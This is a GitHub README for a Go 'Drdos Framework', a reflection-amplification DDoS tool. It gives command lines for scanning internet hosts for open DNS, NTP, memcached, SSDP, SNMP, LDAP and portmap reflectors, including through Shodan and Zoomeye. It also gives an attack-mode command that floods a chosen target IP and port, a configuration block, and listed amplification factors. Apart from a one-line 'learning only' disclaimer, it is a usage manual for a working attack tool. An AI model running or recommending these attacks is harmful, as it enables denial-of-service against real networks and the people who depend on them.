# Drdos Framework

Drdos Framework is my outcome of drdos working. I try to write this like a real framework. Here is the pic of the demo.

![image](https://github.com/chriskaliX/drdos-framework/blob/master/imgs/demo.png)

![image](https://github.com/chriskaliX/drdos-framework/blob/master/imgs/web.png)

## Declaration

This tool is for learning only. Not for illegal use.

## Intruduction

Drdos Framework can check the vulner of drdos iplist. Also it's got the attack mode to start drdos attack.

## Prepare

1. Linux server
2. Golang env

## Usage

- **Command**

    **check Mode** [Good stability, won't fail even with millions of IP address]

    ```shell
    go run main.go -m c -s xx.xx.xx.xx -type dns -api -o test.txt # API Mode
    go run main.go -m c -s xx.xx.xx.xx -type dns -range xx.xx.xx.xx/24 -o test.txt # CIDR
    go run main.go -m c -s xx.xx.xx.xx -type dns -f input.txt -o test.txt # Extract from file
    ```

    **attack Mode**

    ```shell
    go run main.go -m a -f xxx -type dns -t xx.xx.xx.xx -p xx  # be care of the NAT
    ```

    [ * ] 注意 : 运行 `go run main.go --help` 来查看帮助
- **WEB Mode**

    `go run main.go -m h` `Username`: `admin`，`password` will be printed in the console.

### Some help

`--type` should be one of `dns`,`mem`,`ntp`,`snmp`,`ssdp`,`portmap`,`ldap`
`-o` the outputfile is saved in `/data/results/`

### Configuration

The configuration file is in `config/config.go`，and here is the default

```go
package config

const (
    ListenPort     = 50000
    Threshold      = 100
    WaitTime       = 10
    Blacklists     = "/data/blacklists/blacklists"
    MaxAtktime     = 300
    AttackInterval = 0
    ShodanApi      = ""
    ShodanPage     = 10
    ZoomeyeApi     = ""
    ZoomeyePage    = 20
    HttpPort       = 65000
)
```

## Q&A

Q: How much flow can this do?
A: It depends on how many source ip you get, and the type of attack. Memcached nearly 200 times, ntp 10~15 times, ssdp 10 times, dns 5 times...

## Protocol Supported

|Port|Protocol|
|:-:|:-:|
|53|dns|
|111|portmap|
|123|ntp|
|161|snmp|
|389|ldap|
|1900|ssdp|
|11211|memcache|

## Update plan

It will be deleted once I achieve

- [x] HTTP API
  - [x] File Upload and a good display
- [ ] Search engine API
  - [x] Zoomeye
  - [x] Shodan
  - [ ] Fofa
- [x] Blacklist of attack
- [x] Use Context to quit gently
- [ ] check improvement
- [ ] Protocol Support
  - [ ] OpenVPN
- [ ] Use sqlite to save
